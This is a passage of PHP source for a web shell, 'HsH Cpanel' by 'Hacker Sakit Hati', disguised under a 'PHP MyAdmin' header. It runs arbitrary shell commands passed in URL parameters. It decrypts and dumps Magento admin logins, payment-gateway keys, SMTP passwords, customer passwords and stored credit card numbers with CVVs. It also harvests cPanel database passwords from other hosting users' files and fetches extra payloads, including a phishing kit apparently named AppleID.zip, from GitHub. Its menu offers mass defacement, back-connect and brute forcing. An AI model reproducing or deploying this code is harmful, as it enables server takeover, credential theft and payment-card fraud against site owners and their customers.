$x126=$x125[0];


////////// vb ////////////

$x46 = strpos($x120, "200");
$x110="&nbsp;";

if (strpos($x120, "200") == true )
{
$x110= $x11e;
}
elseif (strpos($x123, "200") == true)
{
$x110= $x121;
}
elseif (strpos($x126, "200") == true)
{
$x110= $x124;
}
else
{
continue;

}
flush();

/////////////////////////////////////////////////////////////////////////////////////

$x100 = $x101[1][0];

$x109 = fwrite($xfd,"$x110||$x100 \n");
if($x109){$x11d = '<b style="color: #006600">Save</b>';}else{$x11d = '<b style="color:red">failed</b>';}


echo "<tr><td><a href=http://www.".$x101[1][0].">".$x101[1][0]."</a></td>
<td><a href='$x110'>config</a></td><td>".$x11d."</td></tr>";





flush();


}
}
}
}








break;

case 'help':

echo "<div class='tmp'>
<table align='center' width='40%'><td>function</td><td>Case</td>";


$x12b = ini_get('safe_mode');
if($x12b){$x11d = "<b style='color: red'>False</b>";}else{$x11d = "<b style='color: #336600'>True</b>";}

echo "<tr><td>Safe Mode</td><td>$x11d</td>";

$x12c = function_exists('symlink');
if(!$x12c){$x11d = "<b style='color: red'>False</b>";}else{$x11d = "<b style='color: #336600'>True</b>";}

echo "<tr><td>function symlink</td><td>$x11d</td>";


$x12c = function_exists('file');
if(!$x12c){$x11d = "<b style='color: red'>False</b>";}else{$x11d = "<b style='color: #336600'>True</b>";}

echo "<tr><td>function file</td><td>$x11d</td>";

$x12c = function_exists('file_get_contents');
if(!$x12c){$x11d = "<b style='color: red'>False</b>";}else{$x11d = "<b style='color: #336600'>True</b>";}

echo "<tr><td>function file_get_contents</td><td>$x11d</td>";

$x12c = function_exists('mkdir');
if(!$x12c){$x11d = "<b style='color: red'>False</b>";}else{$x11d = "<b style='color: #336600'>True</b>";}

echo "<tr><td>function mkdir</td><td>$x11d</td>";


$x12c = is_dir('sym/root');
if(!$x12c){$x11d = "<b style='color: red'>False</b>";}else{$x11d = "<b style='color: #336600'>True</b>";}

echo "<tr><td>Permission denied</td><td>$x11d</td>";


$x12c = preg_match('/Forbidden/',@file_get_contents('sym/root') or !@file_get_contents('sym/root'));
if($x12c){$x11d = "<b style='color: red'>False</b>";}else{$x11d = "<b style='color: #006600'>True</b>";}

echo "<tr><td>Forbidden</td><td>$x11d</td>";




echo "</table></div>";



break;
default:
header("Location: $xfe");




}



echo '
<br /><br /><br>';

}


function ex($x12d,$x12e,$x16){
$x12f = explode($x12e,$x12d);
$x12f = explode($x16,$x12f[1]);
return $x12f[0];
}



echo '</div>





</body>

</html></center>
';
	echo'<body bgcolor="black" >
	<center>
	<br>
	<FORM action=""  method="post">
	<div align="center"><br>
	<div align="center">============================[    PHP MyAdmin    ]============================<br><br>
	<input type="hidden" name="form_action" value="2">
	</div>
	</div>
	';
	if($_GET['HsH']){echo"<pre>".shell_exec($_GET["HsH"]);}
	if(file_exists($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml')){
		$x130 = simplexml_load_file($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml');
		if(isset($x130->global->resources->default_setup->connection)) {
		   $x95 = $x130->global->resources->default_setup->connection;
		   $x131 = $x130->global->resources->db->table_prefix;
		   $x13 = $x130->global->crypt->key; //f8cd1881e3bf20108d5f4947e60acfc1
		   require_once $_SERVER['DOCUMENT_ROOT'].'/app/Mage.php';
		   
		   try {
			   $x132 = Mage::app('default');
			   Mage::getSingleton('core/session', array('name'=>'frontend'));
		   }catch(Exception $x53) { echo 'Message: ' .$x53->getMessage()."<br/>\n";}

		   if (!mysql_connect($x95->host, $x95->username, $x95->password)){
			   print("Could not connect: " . mysql_error());
		   }
		   mysql_select_db($x95->dbname);
		   echo $x95->host."|".$x95->username."|".$x95->password."|".$x95->dbname."| $x131 | $x13<br/>\n";

		$x133 = new Varien_Crypt_Mcrypt();
		$x133->init($x13);

		//=========================================================================================================
		$x11b = mysql_query("SELECT user_id,firstname,lastname,email,username,password FROM admin_user where is_active = '1'");
		if (!$x11b){
			  echo "<center><b>Gagal</b></center>";
		}else{
				$xf4 = mysql_fetch_array(mysql_query("SELECT value as website FROM core_config_data WHERE path='web/unsecure/base_url'"));
			  echo'<br><br>
					====================================================================<br>
									[ Admin websitenya : '.$xf4['website'].'] <br>
					====================================================================<br>';
		}
		echo "
		<table border='1' align='center' >
		<tr>
		<td>id</td>
		<td>firstname</td>
		<td>lastname</td>
		<td>email</td>
		<td>username</td>
		<td>password</td>
		</tr>";
			while($x134 = mysql_fetch_array($x11b)) {
			$x135 = 1;
			$x136 = $x134['user_id'];
			$x3a = $x134['username'];
			$x3b = $x134['password'];
			$x137 = $x134['email'];
			$x138 = $x134['firstname'];
			$x139 = $x134['lastname'];
			echo "<tr><pre><td>$x136</td><td>$x138</td><td>$x139</td><td>$x137</td><td>$x3a</td><td>$x3b</td></pre></tr>";
			} 
		echo "</table><br>";
		//=========================================================================================================
		$x11b = mysql_query("SELECT value as user,(SELECT value FROM core_config_data where  path = 'payment/authorizenet/trans_key') as pass FROM core_config_data where path = 'payment/authorizenet/login'");
		if(mysql_num_rows($x11b) != 0){
			if (!$x11b){
				  echo "<center><b>Gagal</b></center>";
			}else{
				  echo'<br><br>
						====================================================================<br>
										[ Authorizenet ] <br>
						====================================================================<br>';
			}
			echo "
			<table border='1' align='center' >
			<tr>
			<td>no</td>
			<td>user</td>
			<td>pass</td>	
			</tr>";
				$x135 = 1;
				while($x134 = mysql_fetch_array($x11b)) {
				$x102 = $x133->decrypt($x134['user']);
				$x114 = $x133->decrypt($x134['pass']);

				
				echo "<tr><pre><td>$x135</td><td>$x102</td><td>$x114</td></pre></tr>";
				$x135++;
				} 
			echo "</table><br>";
		}
		//=========================================================================================================
		$x13a = mysql_query("SELECT (SELECT a.value FROM core_config_data as a WHERE path = 'system/smtpsettings/host') as host , (SELECT b.value FROM core_config_data as b WHERE path = 'system/smtpsettings/port') as port,(SELECT c.value FROM core_config_data as c WHERE path = 'system/smtpsettings/username') as user ,(SELECT d.value FROM core_config_data as d WHERE path = 'system/smtpsettings/password') as pass FROM core_config_data limit 1,1");
		if(mysql_num_rows($x13a) != 0){
			if (!$x13a){
				  echo "<center><b>Gagal</b></center>";
			}else{
				  echo'<br><br>
						====================================================================<br>
										[ SMTP ] <br>
						====================================================================<br>';
			}
			echo "
			<table border='1' align='center' >
			<tr>
			<td>no</td>
			<td>host</td>		
			<td>port</td>
			<td>user</td>
			<td>pass</td>	
			</tr>";
				$x135 = 1;
				$x13b = 0;
				while($x13c = mysql_fetch_array($x13a)) {
					$x13d = $x13c[0];
					$x13e = $x13c[1];
					$x13f = $x13c[2];
					$x140 = $x13c[3];
					echo "<tr><pre><td>$x135</td><td>$x13d</td><td>$x13e</td><td>$x13f</td><td>$x140</td></pre></tr>";
					$x135++;
				}
			echo "</table><br>";
		}
		//=========================================================================================================
		$x11b = mysql_query("SELECT sfo.updated_at,sfo.cc_owner,sfo.method,sfo.cc_number_enc,sfo.cc_cid_enc,CONCAT(sfo.cc_exp_month,' |',sfo.cc_exp_year) as exp,CONCAT(billing.firstname,' | ',billing.lastname,' | ',billing.street,' | ',billing.city,' | ', billing.region,' | ',billing.postcode,' | ',billing.country_id,' | ',billing.telephone,' |-| ',billing.email) AS 'Billing Address' FROM sales_flat_quote_payment AS sfo JOIN sales_flat_quote_address AS billing ON billing.quote_id = sfo.quote_id AND billing.address_type = 'billing'");
		$x141 = mysql_query("SELECT sfo.cc_owner,sfo.method,sfo.cc_number_enc,sfo.cc_cid_status,CONCAT(sfo.cc_exp_month,'|',sfo.cc_exp_year) as exp,CONCAT(billing.firstname,' | ',billing.lastname,' | ',billing.street,' | ',billing.city,' | ', billing.region,' | ',billing.postcode,' | ',billing.country_id,' | ',billing.telephone,' | ',billing.email) AS 'Billing Address' FROM sales_flat_order_payment AS sfo JOIN sales_flat_order_address AS billing ON billing.parent_id = sfo.parent_id AND billing.address_type = 'billing' where cc_number_enc != ''");
		if(mysql_num_rows($x11b) != 0 || mysql_num_rows($x141) != 0){
			  echo'<br><br>
					====================================================================<br>
									[ Credit Card ] <br>
					====================================================================<br>';
				echo "
				<table border='1' align='left' >
				<tr>
				<td>no</td>
				<td>Date</td>
				<td>Credit Owner</td>
				<td>method</td>
				<td>Credit Number</td>
				<td>Credit Exp</td>
				<td>CVV</td>
				<td>Address</td>
				</tr>";
					$x135 = 1;
					$x13b = 0;
					while($x134 = mysql_fetch_array($x11b)){
					$x142 = $x134['updated_at'];
					$x143 = $x134['cc_owner'];
					$x144 = $x134['method'];
					$x145 = $x133->decrypt($x134['cc_number_enc']);
					$x10e = $x134['exp'];		
					$x146 = $x133->decrypt($x134['cc_cid_enc']);	
					$x147 = $x134['Billing Address'];
					echo "<tr><pre><td>$x135</td><td>$x142</td><td>$x143</td><td>$x144</td><td>$x145</td><td>$x10e</td><td>$x146</td><td>$x147</td></pre></tr>";
					$x13b = $x135++;
					}
					
					while($x148 = mysql_fetch_array($x141)){
						$x13b +=1;
					$x143 = $x148['cc_owner'];
					$x144 = $x148['method'];
					$x145 = $x133->decrypt($x148['cc_number_enc']);
					$x10e = $x148['exp'];		
					$x149 = $x133->decrypt($x148['cc_cid_status']);
					$x147 = $x148['Billing Address'];
					echo "<tr><pre><td>$x13b</td><td>$x143</td><td>$x144</td><td>$x145</td><td>$x10e</td><td>$x149</td><td>$x147</td></pre></tr>";
					 $x13b++;
					}	 
					
				echo "</table><br>";	
		}
		//=========================================================================================================
		$x11b = mysql_query("SELECT email,value FROM customer_entity_varchar, customer_entity WHERE customer_entity_varchar.entity_id = customer_entity.entity_id and attribute_id=12");
		$x141 = mysql_query("SELECT customer_email,password_hash FROM sales_flat_quote");
		
		
		if(mysql_num_rows($x11b) != 0 || mysql_num_rows($x141) != 0 ){
			if (!$x11b){
				  echo "<center><b>Gagal</b></center>";
			}else{
				  echo'<br><br>
						====================================================================<br>
										[ Customer ] <br>
						====================================================================<br>';
			}
			echo "
			<table border='1' align='center' >
			<tr>
			<td>no</td>
			<td>user</td>
			<td>pass</td>	
			</tr>";
				$x135 = 1;
				$x13b = 0;
				while($x134 = mysql_fetch_array($x11b)) {
					$x102 = $x134['email'];
					$x114 = $x134['value'];
					echo "<tr><pre><td>$x135</td><td>$x102</td><td>$x114</td></pre></tr>";
					$x13b = $x135++;
				} 
				
				if(mysql_num_rows($x141) != 0 && ($x141)){
					while($x148 = mysql_fetch_array($x141)){
						$x102 = $x148['customer_email'];
						$x114 = $x133->decrypt($x148['password_hash']);
						if(!empty($x102) && !empty($x114)){ //tampilin ketika datanya itu ada klo gk ada ya jangan di tampiin 
							$x13b +=1;
							echo "<tr><pre><td>$x13b</td><td>$x102</td><td>$x114</td></pre></tr>";
							$x13b++;
						}
					}				
				}
			
			echo "</table><br>";
		}
		//=========================================================================================================
	  }
	}
	function save($x14a,$x10){
		$xb2 = fopen($x14a, 'a');
		fwrite($xb2, $x10);
		fclose($xb2);
	}
	function cekbase64($x15){ 
			$x14b = base64_decode($x15, true);
			if (!preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $x15)) return false;
			if(!base64_decode($x15, true)) return false;
			if(base64_encode($x14b) != $x15) return false;
			return true;//nilai return 1 jika true
		}
	//----untuk decode password ---/
	class Varien_Crypt_Mcrypt{
		/**
		 * Constuctor
		 *
		 * @param array $x10
		 */
		public function __construct()
		{
		}

		/**
		 * Initialize mcrypt module
		 *
		 * @param string $x13 cipher private key
		 * @return Varien_Crypt_Mcrypt
		 */
		public function init($x13)
		{
			$this->handler = mcrypt_module_open(MCRYPT_BLOWFISH, '', MCRYPT_MODE_ECB, '');
			$x14c = mcrypt_create_iv (mcrypt_enc_get_iv_size($this->handler), MCRYPT_RAND);
			$x14d = mcrypt_enc_get_key_size($this->handler);

			if (iconv_strlen($x13, 'UTF-8')>$x14d) {
				//throw new Varien_Exception('Maximum key size must should be smaller '.$x14d);
				return null;
			}

			mcrypt_generic_init($this->handler, $x13, $x14c);

			return $this;
		}

		/**
		 * Encrypt data
		 *
		 * @param string $x10 source string
		 * @return string
		 */
		public function encrypt($x10)
		{
			if (!$this->handler) {
				//throw new Varien_Exception('Crypt module is not initialized.');
				return null;
			}
			if (strlen($x10) == 0) {
				return $x10;
			}
			return base64_encode(mcrypt_generic($this->handler, $x10));
		}

		/**
		 * Decrypt data
		 *
		 * @param string $x10 encrypted string
		 * @return string
		 */
		public function decrypt($x10)
		{
			if (!$this->handler) {
				//throw new Varien_Exception('Crypt module is not initialized.');
				return null;
			}
			if (strlen($x10) == 0) {
				return $x10;
			}
			return mdecrypt_generic($this->handler, base64_decode($x10));
		}
			
	 
		/**
		 * Desctruct cipher module
		 *
		 */
		public function __destruct()
		{
			if ($this->handler) {
				$this->_reset();
			}
		}

		protected function _reset()
		{
			mcrypt_generic_deinit($this->handler);
			mcrypt_module_close($this->handler);
		}
	}


//******************************************************************************//

	set_time_limit(0);
	error_reporting(0);

	if(get_magic_quotes_gpc()){
	foreach($_POST as $x13=>$x14){
	$_POST[$x13] = stripslashes($x14);
	}
	}
	echo '
	<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
	<tr><td>Lokasi : ';
if ( isset($_GET['CpC']) )
{
/**
					Hacked By Hacker Sakit Hati

		_  _ ____ ____ _  _ ____ ____ ____ ____ _  _ _ ___ _  _ ____ ___ _ 
		|__| |__| |    |_/  |___ |__/ [__  |__| |_/  |  |  |__| |__|  |  | 
		|  | |  | |___ | \_ |___ |  \ ___] |  | | \_ |  |  |  | |  |  |  | 
                                                               			   

*/

@ini_set('display_errors',0);
function entre2v2($x12d,$x14e,$x14f,$x8c=1){
    $x150=explode($x14e, $x12d);
    $x151=explode($x14f, $x150[$x8c]);
    return trim($x151[0]);
}

echo '<html><head>
<title>HsH Cpanel</title>
<meta content="text/html; charset=utf-8">
<style>
body,table{background:  ; font-family:Verdana,tahoma; color: lime ; font-size:10px }
A:link {text-decoration: none;color: darkviolet;}
A:active {text-decoration: none;color: aqua;}
A:visited {text-decoration: none;color: aqua;}
A:hover {text-decoration: underline; color: Fuchsia;}
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
</style>
<link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif"><center> 
</head><body>';
echo '<div style="font-family: Iceland;font-size: 35pt;text-shadow: 0 0 66px darkviolet, 0 0 5px darkviolet, 0 0 5px darkviolet;color: silver">..::[+  cPanel Open Server +]::.. <br /><sub>Hacker Sakit Hati</sub></div><br/>';


$x152 = @file('/etc/named.conf');
$x153 = scandir("/var/named");

if ($x153 or $x152)
{
    $x153 = scandir("/var/named");
    if($x153) {
echo "<table align='center'><tr><th> No </th><th> Website </th><th> User </th><th> Password </th><th> Hasil </th></tr>";
$x154=1;
$x155 = 0;
$x4b = scandir("/var/named");
foreach($x4b as $x156){
if(strpos($x156,".db")){
$x156 = str_replace('.db','',$x156);
$x157 = posix_getpwuid(fileowner("/etc/valiases/".$x156));
$x158 = '/home/'.$x157['name'].'/.my.cnf';
$xb7 = getcwd();

if (is_readable($x158)) {
copy($x158, ''.$xb7.'/'.$x157['name'].'.txt');
$x159=file_get_contents(''.$xb7.'/'.$x157['name'].'.txt');
$x3b=entre2v2($x159,'password="','"');
echo "<tr><td>".$x154++."</td><td><a href='http://".$x156.":/cpanel' target='_blank'>".$x156."</a></td><td>".$x157['name']."</td><td>".$x3b."</td><td><a href='".$x157['name'].".txt' target='_blank'> Silahkan Dibuka </a></td></tr>";
$x155++;
}

}
}
echo '</table>'; 
$x15a = $x155;
echo '<br><div class="result">Total cPanel Yang Ketemu = '.$x15a.'</h3><br />';
echo '</center>';
}else{
$x152 = @file('/etc/named.conf');
    if($x152) {
echo "<table align='center'><tr><th> No </th><th> Website </th><th> User </th><th> Password </th><th> Hasil </th></tr>";
$x154=1;
$x155 = 0;
$x15b = array();
foreach($x152 as $x15c){
    if(@eregi('zone',$x15c)){
        preg_match_all('#zone "(.*)"#',$x15c,$x156);
        flush();
        if(strlen(trim($x156[1][0])) >2){
            $x15b[] = $x156[1][0];
        }
    }
}
$x15b = array_unique($x15b);
$x15d = array();
$x15e = array();
foreach($x15b as $x15f) {
    $x160 = @posix_getpwuid(fileowner("/etc/valiases/".$x15f));
    $x15d[] = $x160['name'];
    $x15e[] = $x15f;
}
array_multisort($x15d,$x15e);
$x161 = file('/etc/passwd');
$x162 = array();
foreach($x161 as $x163) {
    $x11d = explode(':',$x163);
    if(strpos($x11d[5],'home')) {
        $x162[$x11d[0]] = $x11d[5];
    }
}
$x4a=0;
$x164=1;
foreach($x15d as $x11d) {
$x158 = '/home/'.$x11d.'/.my.cnf';
$xb7 = getcwd();
if (is_readable($x158)) {
copy($x158, ''.$xb7.'/'.$x11d.'.txt');
$x159=file_get_contents(''.$xb7.'/'.$x11d.'.txt');
$x3b=entre2v2($x159,'password="','"');
echo "<tr><td>".$x154++."</td><td><a target='_blank' href=http://".$x15e[$x164-1].'/>'.$x15e[$x164-1].' </a></td><td>'.$x11d."</td><td>".$x3b."</td><td><a href='".$x11d.".txt' target='_blank'> Silahkan Dibuka </a></td></tr>";
$x155++;
                flush();
                $x4a=$x4a?0:1;
                $x164++;
				}
            }
			}
echo '</table>'; 
$x15a = $x155;
echo '<br><div class="result">Total cPanel Yang Ketemu = '.$x15a.'</h3><br />';
echo '</center>';

}
}else{
echo '<center>';
echo "<a href=\"https://www.facebook.com/Antonio.HsH\"><img class=\"logo\" src=\"https://3.bp.blogspot.com/-kqyfUPouqYk/VtYS0lU-ufI/AAAAAAAAADw/5707sF1NYwo/s1600/MemImg402.gif\" alt=\"Mionoon,..\"></a><br><br>\n";
echo "<div class='result'><i><font color='#FF0000'>Server ini Tidak Bisa</font><br><font color='#FF0000'>/var/named</font> or <font color='#FF0000'>etc/named.conf </font>Tidak Di temukan </i></div><br></center>";
}
	}
if ( isset($_GET['Nginceng']) )
{
set_time_limit(0);
@$x162 = fopen('/etc/passwd','r');
if (!$x162) { die('<b>[+] ERROR | GA BISA BACA /etc/passwd [+]</b>'); }
$x165 = array();
$x166 = array();
$x167 = array();
$x8c = 0;
while(!feof($x162))
{
$x12 = fgets($x162);
if ($x8c > 10)
{
$x46 = strpos($x12,':');
$x3a = substr($x12,0,$x46);
$x158 = '/home/'.$x3a.'/public_html/';
if (($x3a != ''))
{
if (is_readable($x158))
{
array_push($x166,$x3a);
array_push($x165,$x158);
}
}
}
$x8c++;
}
echo '<br><br>';
echo "<center><b>[+] Ngintip ".sizeof($x165)." Janda"." [+]</b><br/><br/>";
foreach ($x166 as $x102)
{
$xb7 = "/home/$x102/public_html/";
echo "<a href='?y&#61;$xb7' target='_blank' style='font-weight:bold; color:#;'>$xb7</a><br>";
}
echo "<br>";
echo '</center></body></html>';
	}
	if($_GET['extract']){echo"<pre>".shell_exec($_GET["extract"]);}
if ( isset($_GET['installtmp']) )

{
$x168 = "https://github.com/antoniola/jancok/blob/master/tmp.zip?raw=true";
$x29 = file_get_contents($x168);
$x169 = fopen("tmp.zip" , 'w');
fwrite($x169,$x29);
fclose($x169);
chmod ("tmp.zip" , 0755);
echo '<font color =\'lime\'>Berhasil Menghinstall<br>';
	}
if ( isset($_GET['scmpg']) )
{
$x16a = "https://github.com/antoniola/rejeki/blob/master/AppleID.zip?raw=true";
$x29 = file_get_contents($x16a);
$x169 = fopen("AppleID.zip" , 'w');
fwrite($x169,$x29);
fclose($x169);
chmod ("AppleID.zip" , 0755);
echo '<font color =\'lime\'>Berhasil Menghinstalltmp<br>';
	}
if ( isset($_GET['AdmR']) )
{
$x16b = "https://raw.githubusercontent.com/antoniola/rejeki/master/yoi.php";
$x29 = file_get_contents($x16b);
$x169 = fopen("adm.php" , 'w');
fwrite($x169,$x29);
fclose($x169);
chmod ("adm.php" , 0755);
echo '<font color =\'lime\'>Adminer Berhasil Di Pasang ---> <a href="adm.php"><font color =\'aqua\'>Buka</a> ';
	}
	if(isset($_GET['path'])){
	$xb7 = $_GET['path'];
	}else{
	$xb7 = getcwd();
	}
	$xb7 = str_replace('\\','/',$xb7);
	$x16c = explode('/',$xb7);

	foreach($x16c as $x16d=>$x16e){
	if($x16e == '' && $x16d == 0){
	$x12e = true;
	echo '<a href="?path=/">/</a>';
	continue;
	}
	if($x16e == '') continue;
	echo '<a href="?path=';
	for($x8c=0;$x8c<=$x16d;$x8c++){
	echo "$x16c[$x8c]";
	if($x8c != $x16d) echo "/";
	}
	echo '">'.$x16e.'</a>/';
	}
	echo '</td></tr><tr><td>';
	echo '|<a href="?"><input class="button" type="button" value=Home></a>|<a href="?Croot"><input class="button" type="button" value=Upload></a>|<a href="?UaeZ"><input class="button" type="button" value=Upload-Auto-Extract-Zip></a>|<a href="?Nginceng"><input class="button" type="button" value=Jamping></a>|<a href="?CpC"><input class="button" type="button" value=CPanel-Croot></a>|<a href="?UdMs"><input class="button" type="button" value=User-Domain></a>|<a href="?AdmR"><input class="button" type="button" value=Adminer></a>|<a href="?SmpK"><input class="button" type="button" value=Symlink&Crack-CPanel></a>|<a href="?sws=sym"><input class="button" type="button" value=User-Domains-Symlink></a>|<a href="?sws=passwd""><input class="button" type="button" value=Symlink-Bypass></a>|<a href="?sws=read"><input class="button" type="button" value=Symlink-Bypass-Read></a>|<a href="?sws=joomla"><input class="button" type="button" value=Symlink-Mass-Joomla></a>|<a href="?sws=wp"><input class="button" type="button" value=Symlink-Mass-WordPress></a>|<a href="?sws=vb"><input class="button" type="button" value=Symlink-Mass-vBulletin></a>|<a href="?sws=help"><input class="button" type="button" value=Symlink-Info></a>|<a href="?RmDs"><input class="button" type="button" value=Rooting-Massdeface></a>|<a href="?SwPJmPL"><input class="button" type="button" value=Scaner-WP-JoM-Plugin></a>|<a href="?back"><input class="button" type="button" value=Back-Connect></a>|<a href="?Whmcz211"><input class="button" type="button" value=Brute-Whmcs></a>|<a href="?SbN"><input class="button" type="button" value=Sabun></a>|<a href="?XdRpLs"><input class="button" type="button" value=Xmas-Drupal></a>|<a href="?SloROkaN"><input class="button" type="button" value=Symlink-Wp-JM></a>|<a href="?installtmp"><input class="button" type="button" value=api></a>|<a href="?scmpg"><input class="button" type="button" value=Appel></a>|<a href="?extract=unzip tmp.zip"><input class="button" type="button" value=Extract-Api></a>|<a href="?extract=unzip AppleID.zip"><input class="button" type="button" value=Extract-Appel></a>|<a href="?M"><input class="button" type="button" value=Mailer></a>|<a href="?ExE"><input class="button" type="button" value=Email-Extractor></a>|<a href="?PmE"><input class="button" type="button" value=Pemisah-Email></a>|<a href="?ExTrPCc"><input class="button" type="button" value=Extrap-CC></a>|<a href="?DdCc"><input class="button" type="button" value=Decode-CC></a>|
	</form>
	</td></tr>';
	if(isset($_GET['filesrc'])){
	echo "<tr><td>Current File : ";
	echo $_GET['filesrc'];
	echo '</tr></td></table><br />';
	echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
	}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
	echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
	if($_POST['opt'] == 'chmod'){
	if(isset($_POST['perm'])){
	if(chmod($_POST['path'],$_POST['perm'])){
	echo '<font color="green">Change Permission Sukses</font><br />';
	}else{
	echo '<font color="red">Change Permission Oraiso Cok</font><br />';
	}
	}
	echo '<form method="POST">
	Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="opt" value="chmod">
	<input type="submit" value="Go" />
	</form>';
	}elseif($_POST['opt'] == 'rename'){
	if(isset($_POST['newname'])){
	if(rename($_POST['path'],$xb7.'/'.$_POST['newname'])){
	echo '<font color="green">Change Name Berhasil</font><br />';
	}else{
	echo '<font color="red">Change Name Oraiso Cok</font><br />';
	}
	$_POST['name'] = $_POST['newname'];
	}
	echo '<form method="POST">
	New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="opt" value="rename">
	<input type="submit" value="Go" />
	</form>';
	}elseif($_POST['opt'] == 'edit'){
	if(isset($_POST['src'])){
	$xb2 = fopen($_POST['path'],'w');
	if(fwrite($xb2,$_POST['src'])){
	echo '<font color="green">Edit File Berhasil</font><br />';
	}else{
	echo '<font color="red">Edit File Orai Iso Cok</font><br />';
	}
	fclose($xb2);
	}
	echo '<form method="POST">
	<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="opt" value="edit">
	<input type="submit" value="Go" />
	</form>';
	}
	echo '</center>';
	}else{
	echo '</table><br /><center>';
	if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
	if($_POST['type'] == 'dir'){
	if(rmdir($_POST['path'])){
	echo '<font color="green">Delete Dir Sukses</font><br />';
	}else{
	echo '<font color="red">Delete Dir Oraiso Cok</font><br />';
	}
	}elseif($_POST['type'] == 'file'){
	if(unlink($_POST['path'])){
	echo '<font color="green">Delete File Sukses.</font><br />';
	}else{
	echo '<font color="red">Delete File Oraiso Cok</font><br />';
	}
	}
	}
	echo '</center>';
	$x16f = scandir($xb7);
	echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
	<tr class="first">
	<td><center>Name</center></td>
	<td><center>Size</center></td>
	<td><center>Permissions</center></td>
	<td><center>Options</center></td>
	</tr>';

	foreach($x16f as $x170){
	if(!is_dir("$xb7/$x170") || $x170 == '.' || $x170 == '..') continue;
	echo "<tr>
	<td><a href=\"?path=$xb7/$x170\">$x170</a></td>
	<td><center>--</center></td>
	<td><center>";
	if(is_writable("$xb7/$x170")) echo '<font color="green">';
	elseif(!is_readable("$xb7/$x170")) echo '<font color="red">';
	echo perms("$xb7/$x170");
	if(is_writable("$xb7/$x170") || !is_readable("$xb7/$x170")) echo '</font>';

	echo "</center></td>
	<td><center><form method=\"POST\" action=\"?option&path=$xb7\">
	<select name=\"opt\">
	<option value=\"\"></option>
	<option value=\"delete\">Delete</option>
	<option value=\"chmod\">Chmod</option>
	<option value=\"rename\">Rename</option>
	</select>
	<input type=\"hidden\" name=\"type\" value=\"dir\">
	<input type=\"hidden\" name=\"name\" value=\"$x170\">
	<input type=\"hidden\" name=\"path\" value=\"$xb7/$x170\">
	<input type=\"submit\" value=\"[ ___Pijet___ ]\" />
	</form></center></td>
	</tr>";
	}
	echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
	foreach($x16f as $x29){
	if(!is_file("$xb7/$x29")) continue;
	$x171 = filesize("$xb7/$x29")/1024;
	$x171 = round($x171,3);
	if($x171 >= 1024){
	$x171 = round($x171/1024,2).' MB';
	}else{
	$x171 = $x171.' KB';
	}

	echo "<tr>
	<td><a href=\"?filesrc=$xb7/$x29&path=$xb7\">$x29</a></td>
	<td><center>".$x171."</center></td>
	<td><center>";
	if(is_writable("$xb7/$x29")) echo '<font color="green">';
	elseif(!is_readable("$xb7/$x29")) echo '<font color="red">';
	echo perms("$xb7/$x29");
	if(is_writable("$xb7/$x29") || !is_readable("$xb7/$x29")) echo '</font>';
	echo "</center></td>
	<td><center><form method=\"POST\" action=\"?option&path=$xb7\">
	<select name=\"opt\">
	<option value=\"\"></option>
	<option value=\"delete\">Delete</option>
	<option value=\"chmod\">Chmod</option>
	<option value=\"rename\">Rename</option>
	<option value=\"edit\">Edit</option>
	</select>
	<input type=\"hidden\" name=\"type\" value=\"file\">
	<input type=\"hidden\" name=\"name\" value=\"$x29\">
	<input type=\"hidden\" name=\"path\" value=\"$xb7/$x29\">
	<input type=\"submit\" value=\"[ ___Pijet___ ]\" />
	</form></center></td>
	</tr>";
	}
	echo '</table>
	</div>';
	}
	echo '
	</BODY>
	</HTML>';
	function perms($x29){
	$x172 = fileperms($x29);

	if (($x172 & 0xC000) == 0xC000) {
	// Socket
	$x173 = 's';
	} elseif (($x172 & 0xA000) == 0xA000) {
	// Symbolic Link
	$x173 = 'l';
	} elseif (($x172 & 0x8000) == 0x8000) {
	// Regular
	$x173 = '-';
	} elseif (($x172 & 0x6000) == 0x6000) {
	// Block special
	$x173 = 'b';
	} elseif (($x172 & 0x4000) == 0x4000) {
	// Directory
	$x173 = 'd';
	} elseif (($x172 & 0x2000) == 0x2000) {
	// Character special
	$x173 = 'c';
	} elseif (($x172 & 0x1000) == 0x1000) {
	// FIFO pipe
	$x173 = 'p';
	} else {
	// Unknown
	$x173 = 'u';
	}

	// Owner
	$x173 .= (($x172 & 0x0100) ? 'r' : '-');
	$x173 .= (($x172 & 0x0080) ? 'w' : '-');
	$x173 .= (($x172 & 0x0040) ?
	(($x172 & 0x0800) ? 's' : 'x' ) :
	(($x172 & 0x0800) ? 'S' : '-'));

	// Group
	$x173 .= (($x172 & 0x0020) ? 'r' : '-');
	$x173 .= (($x172 & 0x0010) ? 'w' : '-');
	$x173 .= (($x172 & 0x0008) ?
	(($x172 & 0x0400) ? 's' : 'x' ) :
	(($x172 & 0x0400) ? 'S' : '-'));

	// World
	$x173 .= (($x172 & 0x0004) ? 'r' : '-');
	$x173 .= (($x172 & 0x0002) ? 'w' : '-');
	$x173 .= (($x172 & 0x0001) ?
	(($x172 & 0x0200) ? 't' : 'x' ) :
	(($x172 & 0x0200) ? 'T' : '-'));

	return $x173;
	}
if ( isset($_GET['Croot']) )
{
